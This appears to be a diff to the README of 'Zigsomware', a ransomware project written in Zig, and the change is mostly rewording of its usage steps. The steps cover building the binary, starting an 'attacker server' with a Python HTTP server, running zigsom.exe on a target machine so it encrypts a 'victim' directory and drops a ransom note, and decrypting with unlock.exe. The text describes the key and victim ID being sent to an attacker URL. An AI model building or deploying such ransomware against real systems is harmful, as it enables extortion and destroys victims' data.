@@ -59,8 +59,9 @@ zig build \
 -Dlevel=1
 ```
 
-As above, we need to specify your server host/port/path for allowing the Zigsomware to download a encryption key. We can also set other servers such as `ngrok`.  
-After that, the executables are generated under `zig-out` directory:
+As above, we need to specify the server host/port/path for allowing the Zigsomware to send the encryption key to. We can also set other servers/endpoints such as `ngrok`.  
+
+After building, the executables are generated under `zig-out` directory:
 
 ```sh
 # e.g.
@@ -73,13 +74,13 @@ Do not transfer the `unlock.exe` yet because it is used for decryption.
 
 ## 2. Start Attacker Server
 
-To receive the encryption key and the victim ID, start the web server in your local machine. Here, we simply run Python HTTP server.
+To receive the encryption key and the victim ID from the `zigsom`, we need to start the web server in your local machine. Here, we simply run Python HTTP server.
 
 ```sh
 python3 -m http.server 4444
 ```
 
-## 3. Run Zigsomware (Encryption)
+## 3. Encryption
 
 In the target machine, execute the `zigsom`. We assume that the `victim` directory exist in the current directory.
 
@@ -87,15 +88,15 @@ In the target machine, execute the `zigsom`. We assume that the `victim` directo
 # Check if the 'victim' directory exists.
 dir .\victim
 
-# Now execute files under the 'victim' directory.
+# Now execute it to encrypt files under the 'victim' directory.
 .\zigsom.exe
 ```
 
 When executed, the `zigsom` does the following:
 
-1. Generates the encryption key and encode with Base64.
-2. Sends the Base64-encoded encryption key and the victim ID to our attacker server (`http://127.0.0.1:4444/?id=123456&key=xxxxxxxxxxxxxxxxxx`).
-3. Encrypts files under the `victim` directory that has been specified when `zig build`, using the encryption key.
+1. Generates the encryption key and encodes with Base64.
+2. Sends **the Base64-encoded encryption key** and **the victim ID** to our attacker server (`http://127.0.0.1:4444/?id=123456&key=xxxxxxxxxxxxxxxxxx`).
+3. Using the encryption key, it encrypts files under the `victim` directory that has been specified during `zig build`.
 4. Adds ransom extensions (`.zigsom`) for each file.
 5. Places a ransom note (`README.txt`) in the `victim` directory.
 
@@ -111,7 +112,7 @@ This key (`WN_1jH2JobcU3_9pwxXosWfmnlvB4Ju1pKQiZPRrf8Y` here) is used for decryp
 
 ## 4. Decryption
 
-To decrypt the files, use `unlock.exe` with the Base64-encoded encryption key in the target machine. We (or rather, the victims) execute `unlock.exe` with the Base64-encoded encryption key and the specified directory (`victim` here):
+To decrypt the files, we (or rather, the victims) execute `unlock.exe` with **the Base64-encoded encryption key** and the specified directory (the `victim` here):
 
 ```sh
 # -k: Base64-encoded encryption key
@@ -120,7 +121,7 @@ To decrypt the files, use `unlock.exe` with the Base64-encoded encryption key in
 
 When executed, the `unlock` does the following:
 
-1. Decodes the Base64-encoded encryption key.
-2. Decrypts files under the direcotry (`.\victim\`).
-3. Removes the ransom extension (`.zigsom`) for each file.
+1. Decodes **the Base64-encoded encryption key**.
+2. Decrypts files under the direcotry (`.\victim\`) using the encryption key.
+3. Removes the ransom extensions (`.zigsom`) for each file.
 
